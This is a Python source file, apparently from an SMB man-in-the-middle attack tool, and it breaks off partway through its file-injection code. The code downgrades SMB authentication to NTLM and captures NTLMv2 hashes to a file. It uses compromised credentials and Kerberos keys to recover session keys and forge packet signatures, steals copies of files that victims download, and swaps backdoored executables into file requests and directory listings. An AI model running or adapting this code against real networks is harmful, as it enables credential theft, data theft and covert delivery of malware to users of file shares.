from impacket.smb3 import *
from impacket.smb3structs import *
from impacket import smb
from impacket.spnego import TypesMech
from impacket import ntlm
from impacket import nt_errors
import struct
from impacket.krb5.asn1 import *
import tempfile
import socket
import copy
from random import randint
from impacket import spnego
from pyasn1.codec.der import decoder, encoder
import logging
import traceback
import os
from binascii import hexlify, unhexlify
from SMB_Core import SMB_Core, SMBKey, FileRequestStruct, NTLMV2_Struct, SystemInfo
import copy

import pylnk

import time

from SMB_Core import SMBKey
from ebcLib import MiTMModule
from binascii import hexlify, unhexlify
import hashlib
import traceback
from pyasn1.codec.der import decoder, encoder
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.asn1 import *
import logging
import struct
from pyasn1.error import PyAsn1Error

# For session key & signature computation
from Crypto.Cipher import ARC4
from impacket import crypto
import hashlib
import hmac

EXECUTABLE_EXTENSIONS = ["exe", "msi", "lnk", "war", "jsp", "vbs", "vb"]


class SMB2_Lib(object):

	#<REQUIRED CORE-FUNCTIONALITY FUNCTIONS>
	def __init__(self, data, MiTMModuleConfig = dict()):
		logging.getLogger(__name__).addHandler(logging.NullHandler())
		self.logger = logging.getLogger(__name__)

	
		# Stateful variables
		self.info 					= data 				# The EasySharedMemory object passed from the SMBetray MiTMModule
		self.MiTMModuleConfig 		= MiTMModuleConfig 	# The same MiTMModuleConfig from the parent MiTMModule, loaded by the MiTMServer
		self.DIALECT 				= None 				# To be replaced with the impacket.smb.SMB dialect settled on (eg SMB_DIALECT)
		self.SPOOFED_CLIENT_GUID 	=  ''.join([random.choice(string.letters) for i in range(16)]) # A random client GUID
		
		# Keep track of the server & client info
		self.SERVER_INFO 			= SystemInfo()
		self.CLIENT_INFO 			= SystemInfo()

		# Mandatory variables to track requested files/etc
		self.CREATE_REQUEST_TRACKER		= dict() 	# A dict of FileRequestStruct's with their CREATE_REQUEST_ID (the message id) as their key
		self.FILE_REQUEST_TRACKER 		= dict() 	# a dict of FileRequestStruct's with their GUID as the key
		self.REQUEST_TRACKER 			= dict() 	# Map every message_id to the FileRequestStruct in question
		self.FILE_INFO_CLASS_TRACKER 	= dict() 	# Ties the FILE_INFO_CLASS request to the associated response: self.FILE_INFO_CLASS_TRACKER[message_id] = int(InfoType)
		self.FILE_INFO_TYPE_TRACKER		= dict()	# Ties the INTO_TYPE request to the associated response: self.FILE_INFO_TYPE_TRACKER[message_id]
		self.CURRENT_DIRECTORY 			= ""

		# Auth & Security related variables
		self.SESSION_DIALECT		= None
		self.SESSION_SIGNED 		= False
		self.SESSION_ENCRYPTED 		= False
		self.PREAUTH_PACKET_STACK 	= []		# A list of SMB2Packets to calculate the preauth integerity hash in case SMB3.1.1 is used
		self.KNOWN_KEY 				= None 		# To be replaced with an SMBKey if we have the creds & crack the session key
		self.NTLMV2_DATASTORE 		= []		# Stores all captured NTLMv2 negotiate, challenge, and challenge response messages (for hashes and for session key cracking)
		self.CREDS_DATASTORE 		= []		# Stores all of the domains/users/passwords from the popped-credentials file

		# File swapping variables
		self.BACKDOOR_REQ_DATA 			= dict()	# When we reieve a request for a file meeting our criteria for backdooring, record it in here
		self.BACKDOOR_EXT_SWAP_LIBRARY 	= dict()	# contains keys ordered as 'exe' -> "/directory/extension_file.exe"
		self.BACKDOOR_FILE_SWAP_LIBRARY = dict()
		
		# File injection variables
		self.INJECTION_REQ_DATA 	= dict()	# A dict of SMB packets (message_id is their key) to be parsed by the fullMasquaradeServer 
		self.INJECTED_FILE_TRACKER 	= dict()	# A list of full paths to files we have injected into directories. This keeps track for when we recieve a request for one
		self.INJECT_FILE_LIBRARY 	= dict()	# Just a list of FileRequestStructs of the injected files


		# Prep the files to be injected
		if self.info['attackConfig'].INJECT_FILES_DIR != None:
			self.logger.info("Prepping files to be injected from " + self.info['attackConfig'].INJECT_FILES_DIR)
			for filename in os.listdir(self.info['attackConfig'].INJECT_FILES_DIR):
				newFile 			= FileRequestStruct()
				newFile.FILE_GUID 	= ''.join([random.choice(string.letters) for i in range(16)])
				# Make sure the guid is unique
				while newFile.FILE_GUID in self.FILE_REQUEST_TRACKER:
					newFile.FILE_GUID 		= ''.join([random.choice(string.letters) for i in range(16)])
				newFile.FILE_NAME 			= filename
				newFile.FILE_BYTE_SIZE 		= int(os.stat(self.info['attackConfig'].INJECT_FILES_DIR + "/" + filename).st_size)
				newFile.IS_INJECTED_FILE 	= True
				newFile.LOCAL_FILE_PATH 	= self.info['attackConfig'].INJECT_FILES_DIR + "/" + filename
				self.FILE_REQUEST_TRACKER[newFile.FILE_GUID] 	= newFile
				self.INJECT_FILE_LIBRARY[newFile.FILE_GUID] 	= newFile
		# Prep the content of the file-name specific things being backdoored
		if self.info['attackConfig'].FILENAME_SWAP_DIR != None:
			self.logger.info("Prepping filename-specific content for backdooring from " + self.info['attackConfig'].FILENAME_SWAP_DIR)
			for filename in os.listdir(self.info['attackConfig'].FILENAME_SWAP_DIR):
				newFile 			= FileRequestStruct()
				newFile.FILE_GUID 	= ''.join([random.choice(string.letters) for i in range(16)])
				# Make sure the guid is unique
				while newFile.FILE_GUID in self.FILE_REQUEST_TRACKER:
					newFile.FILE_GUID 		= ''.join([random.choice(string.letters) for i in range(16)])
				newFile.FILE_NAME 			= filename
				newFile.LOCAL_FILE_PATH 	= self.info['attackConfig'].FILENAME_SWAP_DIR + "/" + filename
				newFile.FILE_BYTE_SIZE 		= int(os.stat(self.info['attackConfig'].FILENAME_SWAP_DIR + "/" + filename).st_size)
				newFile.IS_BACKDOOR_TARGET 	= True
				newFile.IS_INJECTED_FILE 	= True
				self.BACKDOOR_FILE_SWAP_LIBRARY[filename.lower()] = newFile
				self.FILE_REQUEST_TRACKER[newFile.FILE_GUID] 	= newFile
		# Prep the content of the extensions being backdoored
		if self.info['attackConfig'].EXTENSION_SWAP_DIR != None:
			self.logger.info("Prepping extensions content for backdooring from " + self.info['attackConfig'].EXTENSION_SWAP_DIR)
			for filename in os.listdir(self.info['attackConfig'].EXTENSION_SWAP_DIR):
				extension 			= filename[filename.find(".")+1:].lower()
				newFile 			= FileRequestStruct()
				newFile.FILE_GUID 	= ''.join([random.choice(string.letters) for i in range(16)])
				# Make sure the guid is unique
				while newFile.FILE_GUID in self.FILE_REQUEST_TRACKER:
					newFile.FILE_GUID 		= ''.join([random.choice(string.letters) for i in range(16)])
				newFile.LOCAL_FILE_PATH 	= self.info['attackConfig'].EXTENSION_SWAP_DIR + "/" + filename
				newFile.FILE_NAME 			= "tmp" #This will be replaced with whatever the client requests that has our target extension
				newFile.FILE_BYTE_SIZE 		= int(os.stat(self.info['attackConfig'].EXTENSION_SWAP_DIR + "/" + filename).st_size)
				newFile.IS_BACKDOOR_TARGET 	= True
				newFile.IS_INJECTED_FILE 	= True
				self.BACKDOOR_EXT_SWAP_LIBRARY[extension.lower()] = newFile
				self.FILE_REQUEST_TRACKER[newFile.FILE_GUID] 	= newFile

	# Split "chained" SMB2 packets, to parse each one 
	# individually - include netbios header in the data variable
	def splitSMBChainedMessages(self, data):
		smbMessages = []
		try:
			# SMB v2
			if(data[4:8] == '\xfe\x53\x4d\x42'):
				z 		= 4
				nx 		= data.find('\xfe\x53\x4d\x42', z + 1)
				while nx > -1:
					smbMessages.append(SMB2Packet(data = copy.deepcopy(data[z:nx])))
					z 		= nx
					nx 		= data.find('\xfe\x53\x4d\x42', z + 1)
				# Required after the last iteration to get the remaining data
				smbMessages.append(SMB2Packet(data = copy.deepcopy(data[z:])))
				return smbMessages
		except Exception, e:
			self.logger.error("[SMB2_Lib::splitSMBChainedMessages] " + str(traceback.format_exc()))
			return data
	# Rejoin the split SMB2 packets to one large
	# "chained" message - includes netbios header
	def restackSMBChainedMessages(self, SMBPacketList, as_client = False):
		reStacked = ""

		for i in range(0, len(SMBPacketList)):
			# Re-stack everything and appropriately adjust the NextCommand fields
			if(i < len(SMBPacketList) - 1):
				SMBPacketList[i]['NextCommand'] = len(str(SMBPacketList[i])) + ((8 - (len(str(SMBPacketList[i])) % 8)) % 8)
				SMBPacketList[i]['Data'] = SMBPacketList[i]['Data'] + str('\x00' * ((8 - (len(str(SMBPacketList[i])) % 8)) % 8)) #Padding
			else:
				SMBPacketList[i]['NextCommand'] = 0

			# Sign the packet, if we're signing stuff
			if(self.SESSION_SIGNED and self.KNOWN_KEY != None):
				if 'Signature' in SMBPacketList[i].__dict__['fields']:
					self.logger.info("Forging signature-previous: " + hexlify(SMBPacketList[i]['Signature']))
				SMBPacketList[i]['Signature'] = '\x00' * 16
				SMBPacketList[i]['Signature'] = self.KNOWN_KEY.sign(SMBPacketList[i], as_client = as_client)
				self.logger.info("Forging signature: " + hexlify(SMBPacketList[i]['Signature']))

			reStacked += str(SMBPacketList[i])
		netbios = struct.pack('>i', len(str(reStacked)))
		# Return the ready-to-send packet
		return str(netbios) + str(reStacked)

	# These methods are required to keep track of what file/directory we're dealing with
	def negotiateReq_track(self, packet):
		req 		= SMB2Negotiate(packet['Data'])
		# https://msdn.microsoft.com/en-us/library/cc246563.aspx
		if(req['SecurityMode'] == 1):
			self.CLIENT_INFO.SIGNATURES_ENABLED 	= True
			self.CLIENT_INFO.SIGNATURES_REQUIRED 	= False
		if(req['SecurityMode'] == 2):
			self.CLIENT_INFO.SIGNATURES_ENABLED 	= False
			self.CLIENT_INFO.SIGNATURES_REQUIRED 	= True
		if(req['SecurityMode'] == 3):
			self.CLIENT_INFO.SIGNATURES_ENABLED 	= True
			self.CLIENT_INFO.SIGNATURES_REQUIRED 	= True
		# Get the dialects
		self.CLIENT_INFO.SUPPORTED_DIALECTS += req['Dialects']

		# Encryption (If client and server put the 'support' flag, encryption will be used)
		if (req['Capabilities'] & SMB2_GLOBAL_CAP_ENCRYPTION) == SMB2_GLOBAL_CAP_ENCRYPTION:
			self.CLIENT_INFO.ENCRYPTION_ENABLED = True
		else:
			self.CLIENT_INFO.ENCRYPTION_ENABLED = False
	def negotiateResp_track(self, packet):
		resp 		= SMB2Negotiate_Response(packet['Data'])
		# https://msdn.microsoft.com/en-us/library/cc246563.aspx
		if(resp['SecurityMode'] == 1):
			self.SERVER_INFO.SIGNATURES_ENABLED 	= True
			self.SERVER_INFO.SIGNATURES_REQUIRED 	= False
		if(resp['SecurityMode'] == 2):
			self.SERVER_INFO.SIGNATURES_ENABLED 	= False
			self.SERVER_INFO.SIGNATURES_REQUIRED 	= True
		if(resp['SecurityMode'] == 3):
			self.SERVER_INFO.SIGNATURES_ENABLED 	= True
			self.SERVER_INFO.SIGNATURES_REQUIRED 	= True

		# Server decides dialect
		self.SESSION_DIALECT = resp['DialectRevision']

		# NTLM_SUPPORTED
		resp 				= SMB2Negotiate_Response(packet['Data'])
		securityBlob 		= SPNEGO_NegTokenInit(data = resp['Buffer'])
		if TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] not in securityBlob['MechTypes']:
			self.SERVER_INFO.NTLM_SUPPORTED = False
		else:
			self.SERVER_INFO.NTLM_SUPPORTED = True

		# Encryption (If client and server put the 'support' flag, encryption will be used)
		if (resp['Capabilities'] & SMB2_GLOBAL_CAP_ENCRYPTION) == SMB2_GLOBAL_CAP_ENCRYPTION:
			self.SERVER_INFO.ENCRYPTION_ENABLED = True
		else:
			self.SERVER_INFO.ENCRYPTION_ENABLED = False
	def createReq_track(self, packet):
		# Reset this stuff
		req 		= SMB2Create(packet['Data'])
		# Grab the file name from the request
		fname 		= os.path.normpath(req['Buffer'][:req['NameLength']])	
		# convert the name into utf8
		try:
			fname 		= fname.decode("utf-16le").encode("utf-8")
			pass
		except UnicodeDecodeError, e:
			if(str(e).find("truncated data") > -1):
				self.logger.debug("[SMB2_Lib::handleRequest]Caught unicode error - trying makeshift solution")
				try:
					fname 	= (fname + '\x00').decode("utf-16le").encode("utf-8")
				except UnicodeDecodeError, e:
					self.logger.critical(str(fname) + " - " + str(e))

		shortName = fname[fname.rfind("\\", 0, len(fname))+1:].lower()
		# Check if they're requesting an injected file
		if fname in self.INJECTED_FILE_TRACKER:
			self.REQUEST_TRACKER[int(packet['MessageID'])] 	= self.INJECTED_FILE_TRACKER[fname]
			return
		# Check if they're requesting a file we want to backdoor
		if shortName in self.BACKDOOR_FILE_SWAP_LIBRARY:
			self.REQUEST_TRACKER[int(packet['MessageID'])] 	= self.BACKDOOR_FILE_SWAP_LIBRARY[shortName]
			return
		# Check if they're requesting a file extension we want to backdoor
		if shortName[shortName.find(".")+1:] in self.BACKDOOR_EXT_SWAP_LIBRARY:
			tmp = copy.deepcopy(self.BACKDOOR_EXT_SWAP_LIBRARY[shortName[shortName.find(".")+1:]])
			tmp.FILE_NAME = shortName
			self.REQUEST_TRACKER[int(packet['MessageID'])] 	= tmp
			return

		self.CREATE_REQUEST_TRACKER[int(packet['MessageID'])] = fname
	def createResp_track(self, packet):
		if int(packet['MessageID']) in self.CREATE_REQUEST_TRACKER:
			resp = SMB2Create_Response(packet['Data'])

			r 				= FileRequestStruct()
			r.FILE_NAME 	= self.CREATE_REQUEST_TRACKER[int(packet['MessageID'])]
			r.FILE_GUID 	= str(resp['FileID'])
			r.FILE_BYTE_SIZE = int(resp['EndOfFile'])

			if(resp['FileAttributes'] & FILE_ATTRIBUTE_DIRECTORY):
				self.CURRENT_DIRECTORY = self.CREATE_REQUEST_TRACKER[packet['MessageID']]
			# Keep track so that we can tie the file GUID to a filename/etc
			self.FILE_REQUEST_TRACKER[str(resp['FileID'])] = r
			self.REQUEST_TRACKER[int(packet['MessageID'])] = r
	def closeReq_track(self, packet):
		data 		= SMB2Close(packet['Data'])
		if(str(data['FileID']) in self.FILE_REQUEST_TRACKER):
			self.REQUEST_TRACKER[int(packet['MessageID'])] = self.FILE_REQUEST_TRACKER[str(data['FileID'])]	
	def readReq_track(self, packet):
		data = SMB2Read(data = packet['Data'])
		if(str(data['FileID']) in self.FILE_REQUEST_TRACKER):
			self.REQUEST_TRACKER[int(packet['MessageID'])] = self.FILE_REQUEST_TRACKER[str(data['FileID'])]	
	def getInfoReq_track(self, packet):
		data = SMB2QueryInfo(packet['Data'])
		if(str(data['FileID']) in self.FILE_REQUEST_TRACKER):
			self.REQUEST_TRACKER[int(packet['MessageID'])] = self.FILE_REQUEST_TRACKER[str(data['FileID'])]	
	def findReq_track(self, packet):
		data = SMB2QueryDirectory(packet['Data'])
		if(str(data['FileID']) in self.FILE_REQUEST_TRACKER):
			self.REQUEST_TRACKER[int(packet['MessageID'])] = self.FILE_REQUEST_TRACKER[str(data['FileID'])]	
		if(hexlify(str(data['FileID'])) == "ffffffffffffffffffffffffffffffff"):
			# Searching the root directory
			r = FileRequestStruct()
			r.FILE_NAME = "."
			self.REQUEST_TRACKER[int(packet['MessageID'])] = r
		self.FILE_INFO_CLASS_TRACKER[int(packet['MessageID'])] 	= int(data['FileInformationClass'])
	def sessionSetupReq_track(self, packet):
		#
		pass
	def sessionSetupResp_track(self, packet):
		self.logger.info("[Notice: Connection dialect " + str(self.SESSION_DIALECT) + "]")
		# At this point, both server & client have come forth with their requirements
		if(self.SERVER_INFO.SIGNATURES_REQUIRED):
			self.logger.info("[Notice: SESSION SIGNED] Server requires signatures :(")
			self.SESSION_SIGNED = True
		else:
			if(self.CLIENT_INFO.SIGNATURES_REQUIRED == True):
				self.logger.info("[Notice: SESSION SIGNED] Client requires signatures :(")
				self.SESSION_SIGNED = True
			else:
				self.logger.info("[Notice: SESSION UNSIGNED] Nobody requires signatures!")
				self.SESSION_SIGNED = False
		if(self.SERVER_INFO.ENCRYPTION_ENABLED and self.CLIENT_INFO.ENCRYPTION_ENABLED):
			self.logger.info("[Notice: SESSION ENCRYPTED] Client & Server both have encryption enabled")
			self.SESSION_SIGNED = True
			self.SESSION_ENCRYPTED = True
		else:
			self.logger.info("[Notice: SESSION UN-ENCRYPTED] Files and information will be in plaintext")
				
	#<PASSIVE FILE RIPPING>
	# 	Grab the name/guid of the file being downloaded
	def readReq_passiveSteal(self, packet):
		data = SMB2Read(data = packet['Data'])
		if(str(data['FileID']) in self.FILE_REQUEST_TRACKER):
			self.REQUEST_TRACKER[int(packet['MessageID'])] = self.FILE_REQUEST_TRACKER[str(data['FileID'])]	
	#   Steal a copy of the file being downloaded
	def readResp_passiveSteal(self, packet):
		if self.REQUEST_TRACKER[int(packet['MessageID'])].DOWNLOADED == True:
			# We've already downloaded this file
			return
		if self.REQUEST_TRACKER[int(packet['MessageID'])].IS_INJECTED_FILE == True:
			# Duh, don't download our own injected file
			return

		# Parse the data
		resp 		= SMB2Read_Response(packet['Data'])
		fname 		= self.REQUEST_TRACKER[int(packet['MessageID'])].FILE_NAME
		shortName 	= fname[fname.rfind("\\", 0, len(fname))+1:]
		
		# Don't bother with pipe stuff
		if(fname == None or fname in [".", "srvsvc", "lsarpc", "wkssvc", "samr"]):
			return

		# If this is the first read-response we're seeing, create the outfile
		if self.REQUEST_TRACKER[int(packet['MessageID'])].LOCAL_OUT_FILE == "":
			dirName 	= ""
			if(fname.find("\\") > -1):
				# Re-create the directory structure (this helps distinguish files with the same name)
				dirName = fname[:fname.rfind("\\", 0, len(fname))].replace("..\\", "").replace("\\", "/")
			#if(dirName.find(":") > -1):
			#	dirName = dirName[dirName.find(":")+1:]
			if(len(dirName) > 0):
				if(dirName[0] == "/"):
					dirName = dirName[1:]
				if(dirName[-1] == "/"):
					dirName = dirName[:-1]
				try:
					os.makedirs(self.info['attackConfig'].PASSIVE_OUTPUT_DIR + "/" + dirName)
				except OSError:
					pass
			fullName = dirName + "/" + shortName
			outName = self.info['attackConfig'].PASSIVE_OUTPUT_DIR + "/" + fullName
			i = 0
			while os.path.exists(outName):
				if outName[-1] != "_0":
					outName += "_0"
				outName = outName[:-1] + str(i)
			self.REQUEST_TRACKER[int(packet['MessageID'])].LOCAL_OUT_FILE = outName

		# Finally, add the new data to the outfile
		with open(self.REQUEST_TRACKER[int(packet['MessageID'])].LOCAL_OUT_FILE, "a") as outFile:
			outFile.write(str(resp['Buffer']))

		self.REQUEST_TRACKER[int(packet['MessageID'])].FILE_BYTES_CAPUTRED += abs(resp['DataLength'])

		if(self.REQUEST_TRACKER[int(packet['MessageID'])].FILE_BYTES_CAPUTRED == self.REQUEST_TRACKER[int(packet['MessageID'])].FILE_BYTE_SIZE):
			self.REQUEST_TRACKER[int(packet['MessageID'])].DOWNLOADED = True
			self.logger.info("Successfully stole a copy of " + str(fullName))
		else:
			self.logger.info("Downloaded " + str(self.REQUEST_TRACKER[int(packet['MessageID'])].FILE_BYTES_CAPUTRED) + "/" + str(self.REQUEST_TRACKER[int(packet['MessageID'])].FILE_BYTE_SIZE) + " bytes of " + self.REQUEST_TRACKER[int(packet['MessageID'])].FILE_NAME)
			return
	

	#<AUTHENTICATION CAPTURE/DOWNGRADE ATTACK>#
	#	<NTLMv2 DOWNGRADE ATTACK>#
	def negotiateResp_authDowngrade(self, packet):
		try:
			# Try to downgrade them to NTLM
			resp 			= SMB2Negotiate_Response(packet['Data'])
			securityBlob 	= SPNEGO_NegTokenInit(data = resp['Buffer'])
			if TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] not in securityBlob['MechTypes']:
				self.logger.info("Server does not support NTLM - auth mechanism downgrade will not work")
				return packet
			self.logger.info("Server supports NTLM auth - Attempting to downgrade....")
			securityBlob['MechTypes'] = [TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism'], TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
			resp['Buffer'] = securityBlob.getData()
			resp['SecurityBufferLength'] = len(resp['Buffer'])
			packet['Data'] = str(resp)
		except:
			pass
		return packet
	#	<NTLMV2 AUTHENTICATION CAPTURE>#
	# 	NTLM Negotiate
	def sessionSetupReq_NTLMv2_Neg(self, packet):
		try:
			req = SMB2SessionSetup(packet['Data'])

			securityBlob = SPNEGO_NegTokenInit(data = req['Buffer'])
			if TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] not in securityBlob['MechTypes']:
				return
			newHash = NTLMV2_Struct()
			newHash.NEGOTIATE_INFO.fromString(securityBlob['Payload'][securityBlob['Payload'].find("NTLMSSP"):])
			
			self.NTLMV2_DATASTORE.append(newHash)
		except: 
			pass
		return packet
	# 	NTLM Challenge
	def sessionSetupResp_NTLMv2_Chal(self, packet):
		resp = SMB2SessionSetup_Response(packet['Data'])
		securityBlob = SPNEGO_NegTokenResp(resp['Buffer'])

		if(len(self.NTLMV2_DATASTORE) == 0):
			return
		# securityBlob.dump()
		self.NTLMV2_DATASTORE[-1].CHALLENGE_INFO.fromString(securityBlob['ResponseToken'][securityBlob['ResponseToken'].find("NTLMSSP"):])
		return packet
	# 	NTLM Challenge-Response/Auth
	def sessionSetupReq_NTLMv2_Auth(self, packet):
		resp = SMB2SessionSetup(packet['Data'])
		securityBlob = SPNEGO_NegTokenResp(resp['Buffer'])
		self.NTLMV2_DATASTORE[-1].RESPONSE_INFO.fromString(securityBlob['ResponseToken'][securityBlob['ResponseToken'].find("NTLMSSP"):])

		if(self.NTLMV2_DATASTORE[-1].RESPONSE_INFO['user_name'] == ''):
			return
		# Dump out the captured NTLMv2 hashes to the screen & to the output file
		ntlmV2Hash = self.NTLMV2_DATASTORE[-1].RESPONSE_INFO['user_name'] + \
							"::" + self.NTLMV2_DATASTORE[-1].RESPONSE_INFO['domain_name'] + \
							":" + hexlify(self.NTLMV2_DATASTORE[-1].CHALLENGE_INFO['challenge']) + \
							":" + hexlify(self.NTLMV2_DATASTORE[-1].RESPONSE_INFO['ntlm'][:16]) + \
							":" + hexlify(self.NTLMV2_DATASTORE[-1].RESPONSE_INFO['ntlm'])[32:]
		self.logger.info(ntlmV2Hash)

		if(self.info['attackConfig'].HASH_OUTPUT_FILE != None):
			r = open(self.info['attackConfig'].HASH_OUTPUT_FILE, "a")
			r.write(ntlmV2Hash + "\n")
			r.close()

		# Now that we've got the full NTLMv2 auth data, try to crack it with
		# some of our popped creds
		# self.info['poppedCredsDB_Lock'].acquire()
		for user in self.info['poppedCredsDB'].keys():
			popped = self.info['poppedCredsDB'][user]
			# If this NTLMv2 data is for a different user, skip
			if self.NTLMV2_DATASTORE[-1].getUser() != (popped.domain.upper() + "/" + popped.username.upper()): continue

			#1. Generate the ntproofstr with our creds & the ntlmv2 auth data 
			ntProofStr = ntlm.hmac_md5(popped.NTResponse, self.NTLMV2_DATASTORE[-1].CHALLENGE_INFO['challenge'] + self.NTLMV2_DATASTORE[-1].getBasicData())

			#2. Compare it to the original. If they match, we popped it.
			if(ntProofStr == self.NTLMV2_DATASTORE[-1].getNtProofString()):
				first_sessionKey = ntlm.hmac_md5(popped.NTResponse, ntProofStr)

				# 3. If there was a key exchange, decrypt the exchanged key
				if(self.NTLMV2_DATASTORE[-1].getExchangedKey() != '\x00' * 16):
						try:
							chandle 		= ARC4.new(first_sessionKey)
							sessionKey 		= chandle.decrypt(self.NTLMV2_DATASTORE[-1].getExchangedKey())
							self.KNOWN_KEY 	= SMBKey(sessionKey, self.SESSION_DIALECT)
							self.info['smbKeyChain'][hash(self.KNOWN_KEY)] = self.KNOWN_KEY

							self.logger.info("\t!!!Compromised SessionBaseKey via NTLMv2!!! " + hexlify(self.KNOWN_KEY.SESSION_BASE_KEY))
							# No longer needed
							del(self.NTLMV2_DATASTORE[-1]) 
							# self.info['poppedCredsDB_Lock'].release()
							return
						except Exception, e:
							self.logger.error(str(e) + " " + traceback.format_exc())
							pass
				else:
					self.KNOWN_KEY 	= SMBKey(first_sessionKey, self.SESSION_DIALECT)
					self.info['smbKeyChain'][hash(self.KNOWN_KEY)] = self.KNOWN_KEY
					# No longer needed
					del(self.NTLMV2_DATASTORE[-1]) 
					# self.info['poppedCredsDB_Lock'].release()
					return
		# self.info['poppedCredsDB_Lock'].release()
		return packet
	# 	NTLM Session Setup complete 
	def sessionSetupResp_NTLMv2_AuthResp(self, packet):
		pass

	#	<KERBEROS MUTUAL AUTHENTICATION CAPTURE>#
	# 	Exctract and try to decrypt the mutual auth kerberos 
	#	ServiceSessionKey with every key in our smbKeyChain.
	def sessionSetupResp_KerberosMututal(self, smbPacket):
		# Pull the most recent keys from kerberos
		while not self.info['kerbPoppedKeys'].empty():
			nKey = self.info['kerbPoppedKeys'].get()
			self.info['smbKeyChain'][hash(nKey)] = copy.deepcopy(nKey)

		st 			= SMB2SessionSetup_Response(data = smbPacket['Data'])['Buffer']

	
		# See if we have the original KERBEROS_SESSION_KEY to decrypt this new Keberos ServiceSessionKey
		for keyHash in self.info['smbKeyChain'].keys():
			smbKey = self.info['smbKeyChain'][keyHash]
			if(smbKey.KERBEROS_SERVICE_SESSION_KEY == ""):
				print("NO KERB SERVICE SESSION KEY IN KEY: " + str(smbKey))
				continue

			# Make sure the keys were generated for this dialect
			smbKey.setDialect(self.SESSION_DIALECT)
			
			try:
				print("Trying key:")
				print(str(smbKey))
				k 			= st.find("\x6f\x81\x87\x30")
				apRep 		= decoder.decode(st[k:], asn1Spec = AP_REP())[0]
				cipher 		= _enctype_table[18]
				cipherText 	= str(apRep['enc-part']['cipher'])
				key 		= Key(18, smbKey.KERBEROS_SERVICE_SESSION_KEY)
				# Key Usage 12
				# AP-REP encrypted part (includes application session
				# subkey), encrypted with the application session key
				# (Section 5.5.2)
				plainText 		= cipher.decrypt(key, 12, cipherText)
				encAPRepPart 	= decoder.decode(plainText, asn1Spec = EncAPRepPart())[0]
				newSessionKey 	= Key(encAPRepPart['subkey']['keytype'], str(encAPRepPart['subkey']['keyvalue']))

				print("\t!!!Compromised SMB SessionBaseKey via Kerberos Mutual Auth!!!\t " + hexlify(newSessionKey.contents[:16]))
				self.KNOWN_KEY 	= SMBKey(sessionBaseKey = newSessionKey.contents[:16], dialect = self.SESSION_DIALECT, kerbSessionKey = smbKey.KERBEROS_SESSION_KEY, kerbServiceSessionKey = newSessionKey.contents)
				self.info['smbKeyChain'][hash(self.KNOWN_KEY)] = self.KNOWN_KEY
				break
			except Exception, e:
				# self.logger.info("FAILED TO POP MUTUAL AUTH WITH \n" + str(smbKey))
				# print(str(e))
				continue

		if self.KNOWN_KEY != None:
			return True
		return False

	
	# 	<GENERIC NTLM & KERBEROS KEY GENERATION>
	# 	Take every set of creds in our poppedCredDB and 
	# 	and run them against the captured NTLMv2 data, as well as 
	# 	set every SMBKey in our keychain (provided by kerberos)
	# 	to the current dialect and test it's generated signature
	# 	to that of the provided packet.
	#
	# 	TL;DR - run this function if we don't have a self.KNOWN_KEY, 
	# 	and we want to throw everything and the kitchen sink.
	def hailMary_keyGeneration(self, packet, as_client = True):
		# self.info['smbKeyChain_Lock'].acquire()
		#<Pull popped keys form the kerberos queue>#

		while not self.info['kerbPoppedKeys'].empty():
			nKey = self.info['kerbPoppedKeys'].get()
			self.info['smbKeyChain'][hash(nKey)] = copy.deepcopy(nKey)

		#<NTLMv2 SessionBaseKey Compromise>#
		# Try all of our NTLMv2 captured stuff against any compromised creds
		# self.info['poppedCredsDB_Lock'].acquire()
		for i in range(0, len(self.NTLMV2_DATASTORE)):
			for user in self.info['poppedCredsDB'].keys():
				popped = self.info['poppedCredsDB'][user]
				# If this NTLMv2 data is for a different user, skip
				if self.NTLMV2_DATASTORE[i].getUser() != (popped.domain.upper() + "/" + popped.username.upper()): continue

				#1. Generate the ntproofstr with our creds & the ntlmv2 auth data 
				ntProofStr = ntlm.hmac_md5(popped.NTResponse, self.NTLMV2_DATASTORE[i].CHALLENGE_INFO['challenge'] + self.NTLMV2_DATASTORE[i].getBasicData())

				#2. Compare it to the original. If they match, we popped it.
				if(ntProofStr == self.NTLMV2_DATASTORE[i].getNtProofString()):
					first_sessionKey = ntlm.hmac_md5(popped.NTResponse, ntProofStr)

					# 3. If there was a key exchange, decrypt the exchanged key
					if(self.NTLMV2_DATASTORE[i].getExchangedKey() != '\x00' * 16):
							try:
								chandle 		= ARC4.new(first_sessionKey)
								sessionKey 		= chandle.decrypt(self.NTLMV2_DATASTORE[i].getExchangedKey())
								self.KNOWN_KEY 	= SMBKey(sessionKey, self.SESSION_DIALECT)
								self.info['smbKeyChain'][hash(self.KNOWN_KEY)] = self.KNOWN_KEY
								# No longer needed
								del(self.NTLMV2_DATASTORE[i]) 
								# self.info['poppedCredsDB_Lock'].release()
								return
							except Exception:
								pass
					else:
						self.KNOWN_KEY 	= SMBKey(first_sessionKey, self.SESSION_DIALECT)
						self.info['smbKeyChain'][hash(self.KNOWN_KEY)] = self.KNOWN_KEY
						# No longer needed
						del(self.NTLMV2_DATASTORE[i]) 
						# self.info['poppedCredsDB_Lock'].release()
						return
		# self.info['poppedCredsDB_Lock'].release()


		#<Kerberos SessionBaseKey Compromise>#
		# Try all of the keys catpured by Kerberos and loaded into the 
		# smbKeyChain against this packet, and try to re-create the
		# signature. If we can, we have popped the session.
		if(packet['Signature'] == '\x00' * 16):
			# We can't test against a blank signature
			return 	
		# self.info['smbKeyChain_Lock'].acquire()
		for keyHash in self.info['smbKeyChain'].keys():
			smbKey = self.info['smbKeyChain'][keyHash]
			# Make sure the keys were generated for this dialect
			smbKey.setDialect(self.SESSION_DIALECT)
			# 
			signature = smbKey.sign(packet, as_client)
			#
			if signature == packet['Signature']:
				self.KNOWN_KEY = smbKey
				self.info['smbKeyChain'][hash(self.KNOWN_KEY)] = self.KNOWN_KEY
				# self.info['smbKeyChain_Lock'].release()
				return
		# self.info['smbKeyChain_Lock'].release()
		
		if self.KNOWN_KEY != None:
			return True
		else:
			return False

	
	#<FILE INJECTION ATTACKS>#
	# 	Injects a file into the fileListing and adds it to the INJECTED_FILE_TRACKER
	def findResp_injectFileListing(self, packet, fileRequestStruct, infoType):
		# self.REQUEST_TRACKER[int(packet['MessageID'])]
		fileName = fileRequestStruct.FILE_NAME.encode("utf-16le")
		# This is a "no more files" packet, so lets bounce
		if(packet['Status'] == 0x80000006):
